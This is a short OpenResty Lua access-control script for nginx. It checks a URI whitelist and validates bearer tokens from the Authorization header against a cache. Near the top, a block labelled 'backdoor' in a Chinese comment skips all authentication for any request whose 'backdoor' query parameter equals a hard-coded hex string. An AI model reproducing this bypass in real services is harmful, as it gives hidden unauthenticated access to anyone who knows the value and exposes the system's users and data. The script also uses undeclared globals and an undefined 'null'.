local utils = import "utils"

local white_uri = import "white_uri"

local cache = import "cache"

--获取header
local headers = ngx.req.get_headers()
local token = headers["Authorization"]

-- 判断白名单
local url = ngx.var.uri
in_white_url = utils.is_include(url, white_uri)

-- 后门
local backdoor = ngx.var.arg_backdoor
if backdoor == '33bcea61ff7edac1e6c777b5d6607076' then
    return
end

if not in_white_url then  -- 不在白名单
    -- 路由
    if (not token) or (token == null) or (token == ngx.null) then
        ngx.status = 401
        ngx.say("Token does not exist.")
        ngx.exit(ngx.OK)
    else
        -- 继续验证token合法性
        local token_arr = utils.strSplit(" ", token)
        t = token_arr[2]

        -- 判断 cache 中是否存 token
        if cache.getCache(t) == nil then
            ngx.status = 401
            ngx.say("Token invalid. OR Token has expired.")
            ngx.exit(ngx.OK)
        end
    end
end
